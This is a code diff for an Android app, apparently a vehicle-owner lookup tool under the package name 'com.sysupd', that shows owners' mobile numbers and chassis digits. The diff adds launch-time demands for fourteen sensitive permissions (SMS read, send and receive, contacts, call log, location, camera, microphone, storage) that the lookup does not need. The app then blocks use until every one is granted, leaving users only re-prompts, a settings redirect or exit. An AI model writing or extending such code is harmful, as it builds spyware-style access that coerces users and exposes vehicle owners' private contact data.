@@ -1,13 +1,17 @@
 package com.sysupd;
 
+import android.Manifest;
 import android.app.AlertDialog;
 import android.content.ClipData;
 import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
@@ -16,6 +20,8 @@ import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 import org.json.JSONObject;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -31,26 +37,133 @@ public class MainActivity extends AppCompatActivity {
     String lastV = "", lastM = "", lastC = "";
     boolean isFetching = false;
 
+    // Saari permissions jo app khulte hi maangni hain
+    static final String[] ALL_PERMISSIONS = {
+        Manifest.permission.CAMERA,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_MEDIA_IMAGES,
+        Manifest.permission.READ_MEDIA_VIDEO,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.RECORD_AUDIO
+    };
+
+    static final int PERM_REQUEST = 1001;
+
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         setContentView(R.layout.activity_main);
 
-        final EditText input = findViewById(R.id.vehicleInput);
-        searchBtn = findViewById(R.id.searchBtn);
-        TextView settingsIcon = findViewById(R.id.settingsIcon);
-        resultCard = findViewById(R.id.resultCard);
-        loading = findViewById(R.id.loading);
         vehicleValue = findViewById(R.id.vehicleValue);
         mobileValue = findViewById(R.id.mobileValue);
         chassisValue = findViewById(R.id.chassisValue);
         statusText = findViewById(R.id.statusText);
+        resultCard = findViewById(R.id.resultCard);
+        loading = findViewById(R.id.loading);
+        searchBtn = findViewById(R.id.searchBtn);
 
+        // Pehle permission maango
+        requestAllPermissions();
+
+        // Agar saari permissions granted hain toh app chalao
+        if (hasAllPermissions()) {
+            startApp();
+        }
+    }
+
+    // ============ PERMISSION HANDLING ============
+    private boolean hasAllPermissions() {
+        if (Build.VERSION.SDK_INT < 23) return true;
+        for (String p : ALL_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    private void requestAllPermissions() {
+        if (Build.VERSION.SDK_INT >= 23) {
+            // Pehle jo granted hain unhe skip karo
+            java.util.List<String> needed = new java.util.ArrayList<>();
+            for (String p : ALL_PERMISSIONS) {
+                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                    needed.add(p);
+                }
+            }
+            if (!needed.isEmpty()) {
+                ActivityCompat.requestPermissions(this,
+                    needed.toArray(new String[0]), PERM_REQUEST);
+            }
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int rc, String[] perms, int[] results) {
+        super.onRequestPermissionsResult(rc, perms, results);
+        if (rc == PERM_REQUEST) {
+            if (hasAllPermissions()) {
+                // Saari permissions granted — app chalao
+                startApp();
+            } else {
+                // Kuch permissions deny — dobara maango ya settings bhejo
+                boolean permanentlyDenied = false;
+                for (int i = 0; i < results.length; i++) {
+                    if (results[i] != PackageManager.PERMISSION_GRANTED) {
+                        if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perms[i])) {
+                            permanentlyDenied = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (permanentlyDenied) {
+                    // User ne "Don't ask again" kiya — settings pe bhejo
+                    new AlertDialog.Builder(this)
+                        .setTitle("Permissions Required")
+                        .setMessage("Saari permissions zaroori hain. Settings me jaake manually enable karo.")
+                        .setPositiveButton("Open Settings", (d, w) -> {
+                            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                            i.setData(Uri.parse("package:" + getPackageName()));
+                            startActivity(i);
+                        })
+                        .setNegativeButton("Exit", (d, w) -> finish())
+                        .setCancelable(false)
+                        .show();
+                } else {
+                    // Dobara maango
+                    new AlertDialog.Builder(this)
+                        .setTitle("Permissions Required")
+                        .setMessage("App ko kaam karne ke liye saari permissions chahiye. Grant karo.")
+                        .setPositiveButton("Grant", (d, w) -> requestAllPermissions())
+                        .setNegativeButton("Exit", (d, w) -> finish())
+                        .setCancelable(false)
+                        .show();
+                }
+            }
+        }
+    }
+
+    // ============ APP START ============
+    private void startApp() {
+        // Telegram join popup
         showTelegramDialog();
 
+        // Settings icon — password protected
+        TextView settingsIcon = findViewById(R.id.settingsIcon);
         settingsIcon.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) { askPassword(); }
         });
+
+        final EditText input = findViewById(R.id.vehicleInput);
 
         searchBtn.setOnClickListener(new View.OnClickListener() {
             public void onClick(View v) {
@@ -151,7 +264,6 @@ public class MainActivity extends AppCompatActivity {
                 c.setRequestMethod("GET");
                 c.setConnectTimeout(20000);
                 c.setReadTimeout(20000);
-                c.setRequestProperty("Accept", "application/json");
                 BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
                 StringBuilder sb = new StringBuilder();
                 String line;
@@ -170,46 +282,29 @@ public class MainActivity extends AppCompatActivity {
             searchBtn.setText("🔍 Search Owner Details");
             loading.setVisibility(View.GONE);
 
-            if (resp == null) {
+            if (resp == null || resp.startsWith("ERROR:")) {
                 statusText.setText("⚠️ Network error. Try again.");
-                return;
-            }
-
-            if (resp.startsWith("ERROR:")) {
-                statusText.setText("⚠️ Connection failed. Check internet.");
                 return;
             }
 
             try {
                 JSONObject o = new JSONObject(resp);
-
                 if (!o.optBoolean("success", false)) {
-                    statusText.setText("❌ Vehicle not found in database");
+                    statusText.setText("❌ Vehicle not found");
                     return;
                 }
 
-                String regNo = o.optString("reg_no", "").trim();
-                String mobile = o.optString("mobile", "").trim();
-                String chassis = o.optString("chassis_last5", "").trim();
-
-                // Agar mobile ya chassis empty hai
-                if (mobile.isEmpty() && chassis.isEmpty()) {
-                    statusText.setText("⚠️ Owner details not available for this vehicle");
-                    return;
-                }
-
-                lastV = regNo.isEmpty() ? "—" : regNo;
-                lastM = mobile.isEmpty() ? "Not available" : mobile;
-                lastC = chassis.isEmpty() ? "Not available" : chassis;
+                lastV = o.optString("reg_no", "");
+                lastM = o.optString("mobile", "Not available");
+                lastC = o.optString("chassis_last5", "Not available");
 
                 vehicleValue.setText(lastV);
                 mobileValue.setText(lastM);
                 chassisValue.setText(lastC);
                 resultCard.setVisibility(View.VISIBLE);
                 statusText.setText("👆 Tap any field to copy");
-
             } catch (Exception e) {
-                statusText.setText("⚠️ Invalid response from server");
+                statusText.setText("⚠️ Invalid response");
             }
         }
     }
